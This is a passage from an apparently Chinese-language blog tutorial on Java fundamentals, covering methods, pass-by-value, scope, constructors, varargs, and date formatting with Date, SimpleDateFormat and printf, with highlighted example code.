class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">      printGrade(<span class="number">78.5</span>);</span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">printGrade</span><span class="params">(<span class="keyword">double</span> score)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">if</span> (score &gt;= <span class="number">90.0</span>) System.out.println(<span class="string">&#x27;A&#x27;</span>);</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> (score &gt;= <span class="number">80.0</span>) System.out.println(<span class="string">&#x27;B&#x27;</span>);</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> (score &gt;= <span class="number">70.0</span>) System.out.println(<span class="string">&#x27;C&#x27;</span>);</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> (score &gt;= <span class="number">60.0</span>) System.out.println(<span class="string">&#x27;D&#x27;</span>);</span><br><span class="line">      <span class="keyword">else</span> System.out.println(<span class="string">&#x27;F&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/20230513125244.png"></p><p>这里printGrade方法是一个void类型方法，它不返回值。</p><p>一个void方法的调用一定是一个语句。 所以，它被在main方法第三行以语句形式调用。就像任何以分号结束的语句一样。</p><p>编译运行结果：</p><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/20230513125325.png"></p><h2 id="通过值传递参数"><a href="#通过值传递参数" class="headerlink" title="通过值传递参数"></a>通过值传递参数</h2><p>调用一个方法时候需要提供参数，你必须按照参数列表指定的顺序提供。</p><p><strong>实例：</strong></p><p>该程序创建一个方法，该方法用于交换两个变量。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestPassByValue</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> number1 = <span class="number">10</span>;</span><br><span class="line">        <span class="keyword">int</span> number2 = <span class="number">24</span>;</span><br><span class="line">        System.out.println(<span class="string">&quot;交换前number1是&quot;</span> + number1 + <span class="string">&quot;,number2是&quot;</span> + number2);</span><br><span class="line">        swap(number1, number2);</span><br><span class="line">        System.out.println(<span class="string">&quot;交换后number1是&quot;</span> + number1 + <span class="string">&quot;,number2是&quot;</span> + number2);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">swap</span><span class="params">(<span class="keyword">int</span> num1, <span class="keyword">int</span> num2)</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;\t在swap中,交换前num1:&quot;</span> + num1 + <span class="string">&quot;,num2是:&quot;</span> + num2);</span><br><span class="line">        <span class="keyword">int</span> temp;</span><br><span class="line">        temp = num1;</span><br><span class="line">        num1 = num2;</span><br><span class="line">        num2 = temp;</span><br><span class="line">        System.out.print(<span class="string">&quot;\t在swap中,交换后&quot;</span>);</span><br><span class="line">        System.out.print(<span class="string">&quot;num1:&quot;</span> + num1);</span><br><span class="line">        System.out.println(<span class="string">&quot;num2:&quot;</span> + num2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/20230513131509.png"></p><p>实例编译运行结果如下：</p><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/20230513131611.png"></p><p>传递两个参数调用swap方法。有趣的是，<strong>方法被调用后，实参的值并没有改变。</strong></p><h2 id="变量作用域"><a href="#变量作用域" class="headerlink" title="变量作用域"></a>变量作用域</h2><ul><li>变量的范围是程序中该变量可以被引用的部分。</li><li>方法内定义的变量被称为局部变量。</li><li>局部变量的作用范围从声明开始，直到包含它的块结束。</li><li>局部变量必须声明才可以使用。</li><li>方法的参数范围涵盖整个方法。参数实际上是一个局部变量。</li><li>for循环的初始化部分声明的变量，其作用范围在整个循环。</li><li>但循环体内声明的变量其适用范围是从它声明到循环体结束。它包含如下所示的变量声明：</li></ul><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/20230513152008.png"></p><p>可以在一个方法里，不同的非嵌套块中多次声明一个具有相同的名称局部变量，但不能在嵌套块内两次声明局部变量。</p><h2 id="命令行参数的使用"><a href="#命令行参数的使用" class="headerlink" title="命令行参数的使用"></a>命令行参数的使用</h2><p>有时候你希望运行一个程序时候再传递给它消息。这要靠传递命令行参数给main()函数实现。</p><p>命令行参数是在执行程序时候紧跟在程序名字后面的信息。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommandLine</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; args.length;i++)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;args[&quot;</span> + i + <span class="string">&quot;]:&quot;</span> + args[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/20230513153105.png"></p><p>运行结果如下：</p><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/20230513152912.png"></p><h2 id="构造方法-1"><a href="#构造方法-1" class="headerlink" title="构造方法"></a>构造方法</h2><p>当一个对象被创建时候，构造方法用来初始化该对象。构造方法和它所在类的名字相同，但<strong>构造方法没有返回值</strong>。</p><p>通常会使用构造方法给一个类的实例变量赋初值，或者执行其它必要的步骤来创建一个完整的对象。</p><p>不管你是否自定义构造方法，所有的类都有构造方法，因为 Java 自动提供了一个默认构造方法，<strong>默认构造方法的访问修饰符和类的访问修饰符相同</strong>(类为 public，构造函数也为 public；类改为 protected，构造函数也改为 protected)。</p><p>一旦你定义了自己的构造方法，默认构造方法就会失效。</p><p><strong>实例</strong>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 一个简单的构造方法</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClass</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> x;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// 以下是构造方法</span></span><br><span class="line">  MyClass() &#123;</span><br><span class="line">    x = <span class="number">10</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以像下面这样调用构造方法来初始化一个对象：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ConsDemo</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">    MyClass t1 = <span class="keyword">new</span> MyClass( <span class="number">10</span> );</span><br><span class="line">    MyClass t2 = <span class="keyword">new</span> MyClass( <span class="number">20</span> );</span><br><span class="line">    System.out.println(t1.x + <span class="string">&quot; &quot;</span> + t2.x);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="可变参数"><a href="#可变参数" class="headerlink" title="可变参数"></a>可变参数</h2><p>JDK 1.5 开始，Java支持传递同类型的可变参数给一个方法。</p><p>方法的可变参数的声明如下所示：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">typeName... parameterName</span><br></pre></td></tr></table></figure><p>在方法声明中，<strong>在指定参数类型后加一个省略号<code>...</code></strong> 。</p><p><strong>一个方法中只能指定一个可变参数，它必须是方法的最后一个参数</strong>。任何普通的参数必须在它之前声明。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">VarargsDemo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 调用可变参数的方法</span></span><br><span class="line">        printMax(<span class="number">34</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">56.5</span>);</span><br><span class="line">        printMax(<span class="keyword">new</span> <span class="keyword">double</span>[]&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125;);</span><br><span class="line">        printMax();</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">printMax</span><span class="params">( <span class="keyword">double</span>... numbers)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (numbers.length == <span class="number">0</span>) &#123;           <span class="comment">//没传参数</span></span><br><span class="line">            System.out.println(<span class="string">&quot;No argument passed&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">double</span> result = numbers[<span class="number">0</span>];</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;  numbers.length; i++)&#123;   <span class="comment">//找最大值。</span></span><br><span class="line">            <span class="keyword">if</span> (numbers[i] &gt;  result) &#123;</span><br><span class="line">                result = numbers[i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;The max value is &quot;</span> + result);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/20230513171710.png"></p><p>编译运行结果为：</p><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/20230513171554.png"></p><h1 id="日期时间"><a href="#日期时间" class="headerlink" title="日期时间"></a>日期时间</h1><p><code>java.util </code>包提供了 Date 类来封装当前的日期和时间。 Date 类提供两个构造函数来实例化 Date 对象。</p><p>第一个构造函数使用当前日期和时间来初始化对象。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Date()</span><br></pre></td></tr></table></figure><p>第二个构造函数接收一个参数，该参数是从 1970 年 1 月 1 日起的毫秒数。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Date(<span class="keyword">long</span> millisec)</span><br></pre></td></tr></table></figure><p>Date 对象创建以后，可以调用下面的方法。</p><table><thead><tr><th align="left">序号</th><th align="left">方法和描述</th></tr></thead><tbody><tr><td align="left">1</td><td align="left"><strong>boolean after(Date date)</strong> 若当调用此方法的Date对象在指定日期之后返回true,否则返回false。</td></tr><tr><td align="left">2</td><td align="left"><strong>boolean before(Date date)</strong> 若当调用此方法的Date对象在指定日期之前返回true,否则返回false。</td></tr><tr><td align="left">3</td><td align="left"><strong>Object clone( )</strong> 返回此对象的副本。</td></tr><tr><td align="left">4</td><td align="left"><strong>int compareTo(Date date)</strong> 比较当调用此方法的Date对象和指定日期。两者相等时候返回0。调用对象在指定日期之前则返回负数。调用对象在指定日期之后则返回正数。</td></tr><tr><td align="left">5</td><td align="left"><strong>int compareTo(Object obj)</strong> 若obj是Date类型则操作等同于compareTo(Date) 。否则它抛出ClassCastException。</td></tr><tr><td align="left">6</td><td align="left"><strong>boolean equals(Object date)</strong> 当调用此方法的Date对象和指定日期相等时候返回true,否则返回false。</td></tr><tr><td align="left">7</td><td align="left"><strong>long getTime( )</strong> 返回自 1970 年 1 月 1 日 00:00:00 GMT 以来此 Date 对象表示的毫秒数。</td></tr><tr><td align="left">8</td><td align="left"><strong>int hashCode( )</strong>  返回此对象的哈希码值。</td></tr><tr><td align="left">9</td><td align="left"><strong>void setTime(long time)</strong>   用自1970年1月1日00:00:00 GMT以后time毫秒数设置时间和日期。</td></tr><tr><td align="left">10</td><td align="left"><strong>String toString( )</strong> 把此 Date 对象转换为以下形式的 String： dow mon dd hh:mm:ss zzz yyyy 其中： dow 是一周中的某一天 (Sun, Mon, Tue, Wed, Thu, Fri, Sat)。</td></tr></tbody></table><h2 id="获取当前日期时间"><a href="#获取当前日期时间" class="headerlink" title="获取当前日期时间"></a>获取当前日期时间</h2><p>Java中获取当前日期和时间很简单，使用 Date 对象的 <code>toString()</code> 方法来<strong>打印当前日期和时间</strong>，如下所示：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DateDemo</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        Date date = <span class="keyword">new</span> Date();</span><br><span class="line">        System.out.println(date.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/20230511003444.png"></p><p>编译运行结果如下：</p><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/20230511003515.png"></p><h2 id="日期比较"><a href="#日期比较" class="headerlink" title="日期比较"></a>日期比较</h2><p>Java使用以下三种方法来比较两个日期：</p><ul><li>使用<code>getTime()</code>方法获取两个日期（自1970年1月1日经历的毫秒数值），然后比较这两个值。</li><li>使用方法<code>before()</code>，<code>after()</code>和<code>equals()</code>。例如，一个月的12号比18号早，则 new Date(99, 2, 12).before(new Date (99, 2, 18)) 返回true。</li><li>使用<code>compareTo()</code>方法，它是由 Comparable 接口定义的，Date 类实现了这个接口。</li></ul><h2 id="使用-SimpleDateFormat-格式化日期"><a href="#使用-SimpleDateFormat-格式化日期" class="headerlink" title="使用 SimpleDateFormat 格式化日期"></a>使用 SimpleDateFormat 格式化日期</h2><p><code>SimpleDateFormat</code>是一个以语言环境敏感的方式来格式化和分析日期的类。<code>SimpleDateFormat</code>允许你选择任何用户自定义日期时间格式来运行。例如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">import</span> java.text.*;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DateDemo</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        Date dateNow = <span class="keyword">new</span> Date();</span><br><span class="line">        SimpleDateFormat format = <span class="keyword">new</span> SimpleDateFormat(<span class="string">&quot;yyyy-MM-dd hh:mm:ss&quot;</span>);   <span class="comment">// yyyy 是完整的公元年，MM 是月份，dd 是日期，HH:mm:ss 是时、分、秒。</span></span><br><span class="line">        System.out.println(<span class="string">&quot;当前时间：&quot;</span> + format.format(dateNow));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/20230511005708.png"></p><p>编译运行结果为：</p><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/20230511005511.png"></p><p><strong>注意</strong>:有的格式大写，有的格式小写，例如 MM 是月份，mm 是分；HH 是 24 小时制，而 hh 是 12 小时制。</p><h2 id="日期和时间的格式化编码"><a href="#日期和时间的格式化编码" class="headerlink" title="日期和时间的格式化编码"></a>日期和时间的格式化编码</h2><p>时间模式字符串用来指定时间格式。在此模式中，所有的 ASCII 字母被保留为模式字母，定义如下：</p><table><thead><tr><th align="left"><strong>字母</strong></th><th align="left"><strong>描述</strong></th><th align="left"><strong>示例</strong></th></tr></thead><tbody><tr><td align="left">G</td><td align="left">纪元标记</td><td align="left">AD</td></tr><tr><td align="left">y</td><td align="left">四位年份</td><td align="left">2001</td></tr><tr><td align="left">M</td><td align="left">月份</td><td align="left">July or 07</td></tr><tr><td align="left">d</td><td align="left">一个月的日期</td><td align="left">10</td></tr><tr><td align="left">h</td><td align="left">A.M./P.M. (1~12)格式小时</td><td align="left">12</td></tr><tr><td align="left">H</td><td align="left">一天中的小时 (0~23)</td><td align="left">22</td></tr><tr><td align="left">m</td><td align="left">分钟数</td><td align="left">30</td></tr><tr><td align="left">s</td><td align="left">秒数</td><td align="left">55</td></tr><tr><td align="left">S</td><td align="left">毫秒数</td><td align="left">234</td></tr><tr><td align="left">E</td><td align="left">星期几</td><td align="left">Tuesday</td></tr><tr><td align="left">D</td><td align="left">一年中的日子</td><td align="left">360</td></tr><tr><td align="left">F</td><td align="left">一个月中第几周的周几</td><td align="left">2 (second Wed. in July)</td></tr><tr><td align="left">w</td><td align="left">一年中第几周</td><td align="left">40</td></tr><tr><td align="left">W</td><td align="left">一个月中第几周</td><td align="left">1</td></tr><tr><td align="left">a</td><td align="left">A.M./P.M. 标记</td><td align="left">PM</td></tr><tr><td align="left">k</td><td align="left">一天中的小时(1~24)</td><td align="left">24</td></tr><tr><td align="left">K</td><td align="left">A.M./P.M. (0~11)格式小时</td><td align="left">10</td></tr><tr><td align="left">z</td><td align="left">时区</td><td align="left">Eastern Standard Time</td></tr><tr><td align="left">‘</td><td align="left">文字定界符</td><td align="left">Delimiter</td></tr><tr><td align="left">“</td><td align="left">单引号</td><td align="left">`</td></tr></tbody></table><h2 id="使用printf格式化日期"><a href="#使用printf格式化日期" class="headerlink" title="使用printf格式化日期"></a>使用printf格式化日期</h2><p>printf 方法可以很轻松地格式化时间和日期。使用两个字母格式，它以 <strong>%t</strong> 开头并且以下面表格中的一个字母结尾。</p><ul><li>%tY：输出四位数的年份，例如：2023</li><li>%ty：输出两位数的年份，例如：23</li><li>%tm：输出两位数的月份，例如：02</li><li>%tB：输出月份的全名，例如：February</li><li>%tb：输出月份的缩写，例如：Feb</li><li>%tA：输出星期的全名，例如：Wednesday</li><li>%ta：输出星期的缩写，例如：Wed</li><li>%td：输出两位数的日期，例如：24</li><li>%te：输出一位或两位数的日期，例如：24 或 02</li><li>%tH：输出24小时制的小时数，例如：23</li><li>%tI：输出12小时制的小时数，例如：11</li><li>%tM：输出分钟数，例如：45</li><li>%tS：输出秒数，例如：30</li><li>%tp：输出上午还是下午，例如：AM 或 PM</li><li>%tZ：输出时区，例如：GMT+08:00</li></ul><table><thead><tr><th align="left">转换符</th><th align="left">说明</th><th align="left">示例</th></tr></thead><tbody><tr><td align="left">%tc</td><td align="left">包括全部日期和时间信息</td><td align="left">星期六 十月 27 14:21:20 CST 2007</td></tr><tr><td align="left">%tF</td><td align="left">“年-月-日”格式</td><td align="left">2007-10-27</td></tr><tr><td align="left">%tD</td><td align="left">“月/日/年”格式</td><td align="left">10/27/07</td></tr><tr><td align="left">%tr</td><td align="left">“HH:MM:SS PM”格式（12时制）</td><td align="left">02:25:51 下午</td></tr><tr><td align="left">%tT</td><td align="left">“HH:MM:SS”格式（24时制）</td><td align="left">14:28:16</td></tr><tr><td align="left">%tR</td><td align="left">“HH:MM”格式（24时制）</td><td align="left">14:28</td></tr></tbody></table><p><strong>实例A</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DateDemo</span></span>&#123;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">      Date date = <span class="keyword">new</span> Date();</span><br><span class="line">      System.out.printf(<span class="string">&quot;%tY-%tm-%td %tH:%tM:%tS %tZ&quot;</span>, date, date, date, date, date, date, date);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/20230511010959.png"></p><p>编译运行结果为：</p><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/20230511011036.png"></p><p><u>注意：菜鸟教程的这个实例的第五行代码缺少一个date。</u></p><p><strong>案例B</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DateDemo</span> </span>&#123;</span><br><span class="line"> </span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">     <span class="comment">// 初始化 Date 对象</span></span><br><span class="line">     Date date = <span class="keyword">new</span> Date();</span><br><span class="line"> </span><br><span class="line">     <span class="comment">//c的使用  </span></span><br><span class="line">    System.out.printf(<span class="string">&quot;全部日期和时间信息：%tc%n&quot;</span>,date);          </span><br><span class="line">    <span class="comment">//f的使用  </span></span><br><span class="line">    System.out.printf(<span class="string">&quot;年-月-日格式：%tF%n&quot;</span>,date);  </span><br><span class="line">    <span class="comment">//d的使用  </span></span><br><span class="line">    System.out.printf(<span class="string">&quot;月/日/年格式：%tD%n&quot;</span>,date);  </span><br><span class="line">    <span class="comment">//r的使用  </span></span><br><span class="line">    System.out.printf(<span class="string">&quot;HH:MM:SS PM格式（12时制）：%tr%n&quot;</span>,date);  </span><br><span class="line">    <span class="comment">//t的使用  </span></span><br><span class="line">    System.out.printf(<span class="string">&quot;HH:MM:SS格式（24时制）：%tT%n&quot;</span>,date);  </span><br><span class="line">    <span class="comment">//R的使用  </span></span><br><span class="line">    System.out.printf(<span class="string">&quot;HH:MM格式（24时制）：%tR&quot;</span>,date);  </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/20230511011348.png"></p><p>编译运行结果为：</p><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/20230511230147.png"></p><p>如果你需要重复提供日期，那么利用这种方式来格式化它的每一部分就有点复杂了。因此，可以利用一个格式化字符串指出要被格式化的参数的索引。</p><p>索引必须紧跟在 <strong>%</strong> 后面，而且必须以 <strong>$</strong> 结束。例如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DateDemo</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        Date date = <span class="keyword">new</span> Date();</span><br><span class="line">        System.out.printf(<span class="string">&quot;%1$s %2$tB %2$td, %2$tY&quot;</span>,<span class="string">&quot;Due date:&quot;</span>,date);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/20230511232501.png"></p><p>编译运行结果如下：</p><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/20230511232555.png"></p><p>或者，你可以使用 &lt; 标志。它表明先前被格式化的参数要被再次使用。例如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DateDemo</span> </span>&#123;</span><br><span class="line"> </span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">       <span class="comment">// 初始化 Date 对象</span></span><br><span class="line">       Date date = <span class="keyword">new</span> Date();</span><br><span class="line">        </span><br><span class="line">       <span class="comment">// 显示格式化时间</span></span><br><span class="line">       System.out.printf(<span class="string">&quot;%s %tB %&lt;te, %&lt;tY&quot;</span>, </span><br><span class="line">                         <span class="string">&quot;Due date:&quot;</span>, date);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/20230511232808.png"></p><p>编译运行结果如下：</p><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/20230511232845.png"></p><p>定义日期格式的转换符可以使日期通过指定的转换符生成新字符串。这些日期转换符如下所示：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DateDemo</span> </span>&#123;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">       Date date=<span class="keyword">new</span> Date();                                      </span><br><span class="line">        <span 